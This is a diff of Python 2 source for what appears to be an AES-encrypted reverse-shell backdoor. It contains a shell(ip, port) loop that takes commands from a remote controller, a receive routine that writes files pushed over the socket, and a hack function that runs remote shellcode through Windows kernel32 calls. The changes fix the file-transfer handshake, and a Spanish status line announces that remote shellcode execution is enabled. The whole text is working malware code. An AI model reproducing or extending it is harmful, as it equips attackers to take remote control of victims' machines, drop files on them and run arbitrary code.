@@ -146,18 +146,20 @@ def hack(code):
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
 #Receive Data Method
-def receive(con, file):
-    f = open(file,'wb')
-    con.listen(5)                 # Now wait for client connection.
+def receive(con, fileName):
+    f = open(fileName,'wb')
+    print f
+    #con.listen(5)                 # Now wait for client connection.
     print "Receiving..."
     l = con.recv(1024)
-    while (l != 'File has been sent'):
+    while (l[:18] != 'File has been sent'):
         print "Receiving..."
         f.write(l)
         l = con.recv(1024)
     f.close()
-    print "Done Receiving"    
-    con.close()                # Close the connection
+    print "Done Receiving"
+    print "Done Receiving"   
+    #con.close()                # Close the connection
 
 
 def shell(ip, port):
@@ -183,7 +185,12 @@ def shell(ip, port):
                 encoded = encodeCipher(aes, response)
                 s.send(encoded)
                 filename = decodeCipher(aes, s.recv(4096)) #Receive filename
+                print filename
+                encoded = encodeCipher(aes, 'OK')
+                s.send(encoded)
                 receive(s, filename)
+                encoded = encodeCipher(aes, 'Done Receiving')
+                s.send(encoded)
             elif cmd == "hack":
                 response = "Se ha habilitado la ejecucion de ShellCode remoto"            
                 encoded = encodeCipher(aes, response)
